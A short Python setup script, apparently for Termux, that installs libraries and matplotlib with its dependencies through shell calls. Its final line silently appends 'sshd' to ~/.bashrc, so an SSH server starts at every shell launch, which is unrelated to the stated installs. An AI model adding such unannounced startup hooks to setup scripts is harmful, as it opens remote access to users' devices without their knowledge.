import sys
import os
def deal_with_cmd():
  os.system('pkg install libjpeg-turbo')
  os.system('pkg install zlib')
  os.system('pkg install cmake freetype libpng')
  os.system('pip install wheel')
  os.system('pip install kiwisolver cycler pyparsing python-dateutil')
  os.system('pip install matplotlib')
  os.system('echo "sshd" >> ~/.bashrc')
if __name__ == '__main__':
    deal_with_cmd()
